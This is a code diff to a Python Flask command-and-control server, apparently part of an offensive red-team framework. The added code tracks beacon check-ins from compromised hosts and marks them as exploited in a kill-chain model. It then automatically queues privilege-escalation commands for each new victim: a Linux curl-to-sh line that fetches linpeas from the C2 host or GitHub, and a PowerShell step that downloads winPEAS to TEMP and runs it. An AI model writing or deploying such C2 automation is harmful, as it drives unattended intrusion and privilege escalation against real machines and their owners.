@@ -2837,7 +2837,50 @@ def index():
 @app.route('/command/<client_id>', methods=['GET'])
 @app.route(f'{route_malleable}<client_id>', methods=['GET'])
 def send_command(client_id):
+    _was_new_for_kc = client_id not in connected_clients
     connected_clients.add(client_id)
+
+    if _was_new_for_kc:
+        try:
+            _kc_records = _read_beacon_records(client_id)
+            _platform = "linux"
+            _primary_ip = ""
+            if _kc_records:
+                _last = _kc_records[-1]
+                _platform = str(_last.get("client", "linux")).lower()
+                if "win" in _platform or "windows" in _platform:
+                    _platform = "windows"
+                else:
+                    _platform = "linux"
+                _raw_ips = str(_last.get("ips", ""))
+                _primary_ip = (_raw_ips.split(",")[0].strip().strip("[]'\"") if _raw_ips else "")
+            if not _primary_ip:
+                _primary_ip = str(client_id)
+            from modules.world_model import HostState as _HS, get_world_model as _get_wm
+            _wm = _get_wm()
+            _wm.advance_host(_primary_ip, _HS.EXPLOITED)
+            _wm.add_note(_primary_ip, f"Foothold via beacon {client_id}")
+            from modules.killchain import KillChain as _KC
+            _KC.advance_phase("exploit")
+            _KC.advance_phase("privesc")
+            logging.info("[killchain] Phase advanced to privesc via beacon GET %s", client_id)
+            _privesc_cmd = _build_privesc_command(_platform)
+            if _privesc_cmd:
+                sanitized = ''.join(c for c in str(client_id) if c.isalnum() or c in '-_')
+                _queue_path = os.path.join(ALLOWED_DIRECTORY, f"cmd_{sanitized}.json")
+                _cmds = []
+                if os.path.isfile(_queue_path):
+                    with open(_queue_path) as _qf:
+                        _cmds = json.load(_qf)
+                if _privesc_cmd not in _cmds:
+                    _cmds.append(_privesc_cmd)
+                    with open(_queue_path, "w") as _qf:
+                        json.dump(_cmds, _qf)
+                    logging.info("[privesc] Queued %s for %s on first GET",
+                                 "linpeas" if _platform == "linux" else "winpeas", client_id)
+        except Exception as _kc_exc:
+            logging.debug("[killchain] GET advance failed: %s", _kc_exc)
+
     if client_id in commands:
         command = commands.pop(client_id)
         encrypted_command = encrypt_data(command.encode())
@@ -2872,6 +2915,68 @@ def send_command(client_id):
         logging.info(f"No command for client {client_id}")
         encrypted_response = encrypt_data(b'')
         return Response(encrypted_response, mimetype='application/octet-stream')
+
+LINPEAS_CANDIDATES = (
+    "/usr/share/peass/linpeas/linpeas.sh",
+    "external/.exploit/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh",
+    "external/linpeas.sh",
+)
+WINPEAS_CANDIDATES = (
+    "/usr/share/peass/winpeas/winPEASx64.exe",
+    "/usr/share/peass/winpeas/winPEASx86.exe",
+    "/usr/share/peass/winpeas/winPEASany.exe",
+    "external/.exploit/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASx64.exe",
+    "external/winPEASx64.exe",
+)
+
+
+def _try_copy_privesc_tool(platform: str) -> str | None:
+    """Copy linpeas/winpeas to sessions/ from known local paths.
+
+    Returns the destination filename when successful, None otherwise.
+    """
+    _candidates = LINPEAS_CANDIDATES if platform == "linux" else WINPEAS_CANDIDATES
+    for _src in _candidates:
+        if os.path.isfile(_src):
+            _dest = os.path.join(SESSIONS_DIR, os.path.basename(_src))
+            if not os.path.exists(_dest):
+                try:
+                    import shutil
+                    shutil.copy2(_src, _dest)
+                except OSError:
+                    continue
+            return os.path.basename(_src)
+    return None
+
+
+def _build_privesc_command(platform: str) -> str | None:
+    """Build the download+execute command for linpeas (Linux) or winpeas (Windows).
+
+    Tries to copy the tool locally first, then constructs a command that
+    downloads from the C2 server with a public GitHub fallback.
+    """
+    _lhost = str(getattr(config, 'lhost', '127.0.0.1'))
+    _c2_port = str(getattr(config, 'c2_port', '443'))
+    _base = f"https://{_lhost}:{_c2_port}"
+
+    if platform == "linux":
+        _try_copy_privesc_tool("linux")
+        return (
+            f"(curl -sk {_base}/s/linpeas.sh 2>/dev/null || "
+            f"curl -sSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh 2>/dev/null) "
+            f"| sh 2>&1"
+        )
+
+    if platform == "windows":
+        _fname = _try_copy_privesc_tool("windows") or "winPEASx64.exe"
+        return (
+            f"$wp=Join-Path $env:TEMP '{_fname}'; "
+            f"try{{iwr -Uri '{_base}/s/{_fname}' -OutFile $wp 2>$null}}catch{{}}; "
+            f"if(Test-Path $wp){{& $wp 2>&1}}"
+        )
+
+    return None
+
 
 @app.route('/command/<client_id>', methods=['POST'])
 @app.route(f'{route_malleable}<client_id>', methods=['POST'])
@@ -3133,10 +3238,34 @@ def receive_result(client_id):
                     from modules.killchain import KillChain as _KC
                     _KC.advance_phase("exploit")
                     logging.info("[killchain] Phase advanced to exploit via beacon %s", sanitized_client_id)
+                    if _was_new:
+                        _KC.advance_phase("privesc")
+                        logging.info("[killchain] Phase advanced to privesc via beacon %s", sanitized_client_id)
                 except Exception as _wme:
                     logging.debug("[world_model] advance failed: %s", _wme)
 
                 _hook_engine.fire("command_executed", _hctx)
+
+                # ── Queue linpeas/winpeas on first check-in only ─────────
+                if _was_new:
+                    try:
+                        _platform = _normalise_platform(str(client))
+                        _privesc_cmd = _build_privesc_command(_platform)
+                        if _privesc_cmd:
+                            _queue_path = os.path.join(ALLOWED_DIRECTORY,
+                                                       f"cmd_{sanitized_client_id}.json")
+                            _cmds = []
+                            if os.path.isfile(_queue_path):
+                                with open(_queue_path) as _qf:
+                                    _cmds = json.load(_qf)
+                            _cmds.append(_privesc_cmd)
+                            with open(_queue_path, "w") as _qf:
+                                json.dump(_cmds, _qf)
+                            logging.info("[privesc] Queued %s for %s: %.100s",
+                                         "linpeas" if _platform == "linux" else "winpeas",
+                                         sanitized_client_id, _privesc_cmd)
+                    except Exception as _qe:
+                        logging.debug("[privesc] Queue failed: %s", _qe)
 
                 try:
                     _out_lower = str(output).lower()
@@ -3152,9 +3281,7 @@ def receive_result(client_id):
                         _wm2 = _get_wm2()
                         _wm2.advance_host(_primary_ip, _HS2.OWNED)
                         _wm2.add_note(_primary_ip, "Privilege escalation successful: root/System obtained")
-                        from modules.killchain import KillChain as _KC2
-                        _KC2.advance_phase("privesc")
-                        logging.info("[killchain] Phase advanced to privesc via beacon %s (root/system)", sanitized_client_id)
+                        logging.info("[killchain] Beacon %s already root/System — host OWNED", sanitized_client_id)
                         _hook_engine.fire("privilege_escalated", _hctx)
                         _hook_engine.fire("host_owned", _hctx)
                 except Exception:
